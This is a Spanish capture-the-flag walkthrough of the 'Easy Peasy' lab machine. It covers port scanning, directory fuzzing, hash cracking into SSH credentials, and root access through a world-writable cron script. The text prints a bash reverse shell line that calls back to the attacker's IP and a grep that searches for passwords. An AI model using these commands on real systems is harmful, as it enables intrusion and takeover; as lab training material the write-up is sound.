# Easy Peasy

Esta `room` también nos dice lo que tenemos que hacer en cada momento.

# Análisis

Empecemos con un escaneo de puertos sencillo y sigamos con uno *complejo* para ver más información de los servicios instalados:
![alt text](img/image.png)
> Hacer siempre un escaneo de todos los puertos, nunca se sabe.

<br>

Como este escaneo no nos resuelve todas las dudas, vamos a hacer uno para esos puertos pero con un poco más de información:
![alt text](img/image-1.png)

<br>

Vamos a comentarlo un poco por encima:

- Puerto 80 (nginx 1.16.1)
- Puerto 6498 (OpenSSH 7.6p1)
- Puerto 65524 (Apache httpd 2.4.43)
- SO (Linux 4.15)

Ahora que sabemos los servicios http que existen en la máquina, vamos a analizarlos uno a uno.
![alt text](img/image-2.png)
![alt text](img/image-3.png)

Parece que vamos a tener que fuzzear los directorios:

- nginx

![alt text](img/image-4.png)

1. hidden
    ![alt text](img/image-5.png)
    ![alt text](img/image-7.png)

    <br>

    No parece que la imágen tenga algo escondido.

    <br>

    ![alt text](img/image-8.png)
    ![alt text](img/image-9.png)
    ![alt text](img/image-10.png)
    > Primera flag

    <br>

2. robots.txt
    ![alt text](img/image-6.png)
    > **F**

    <br>

- apache

![alt text](img/image-11.png)

<br>

1. index.html
    ![alt text](img/image-12.png)
    ![alt text](img/image-13.png)
    
    <br>

    ![alt text](img/image-17.png)
    Tercera flag

    <br>

2. robots.txt
    ![alt text](img/image-15.png)
    ![alt text](img/image-16.png)
    Segunda flag

    <br>

3. /n0th1ng3ls3m4tt3r/
    ![alt text](img/image-14.png)
    Se trata del hash de una contraseña y una imágen(raro)

    <br>

    ![alt text](img/image-18.png)
    > Es un hash en sha256

    <br>

    ![alt text](img/image-19.png)
    > La crackemos con john the reaper

    <br>

    ![alt text](img/image-20.png)
    ![alt text](img/image-21.png)
    ![alt text](img/image-22.png)
    > user: boring
    > pass: iconvertedmypasswordtobinary

    <br>

Acabamos el *análisis* y empezamos el ataque, tenemos el usuario y la contraseña del ssh:
![alt text](img/image-23.png)

Entramos en la máquina como el usuario boring(sin privilegios)
<br>

![alt text](img/image-24.png)
> Nos dice que está rotado(ROT)

<br>

![alt text](img/image-25.png)

<br>

Ahora toca escalar privilegios.

![alt text](img/image-26.png)
> No podemos ejecutar sudo

<br>

![alt text](img/image-27.png)
> Un programa que nos permite ejecutar comandos por otros usuarios...

<br>

![alt text](img/image-28.png)
> Pide la contraseña del root, no funciona

<br>

```bash
grep -r "password" /home /etc 2>/dev/null
```
> Podría... pero no

<br>

![alt text](img/image-29.png)

En crontab, programa que ejecuta scripts, programas, etc. cada x tiempo; vemos que hay un archivo que se ejecuta cada minuto por el usuario root.
<br>

![alt text](img/image-30.png)

Y un usuario normal puede editar este archivo.
<br>

![alt text](img/image-31.png)
> bash -i >& /dev/tcp/{ip_local}/4242 0>&1


<br>

![alt text](img/image-32.png)

<br>

![alt text](img/image-33.png)

Ponemos un puerto en escucha en nuestr máquina y esperamos un minuto(aprox)
<br>

![alt text](img/image-34.png)

Y ya estaría, hemos accedido a la máquina con root.

## USER? Si

## ROOT? Si
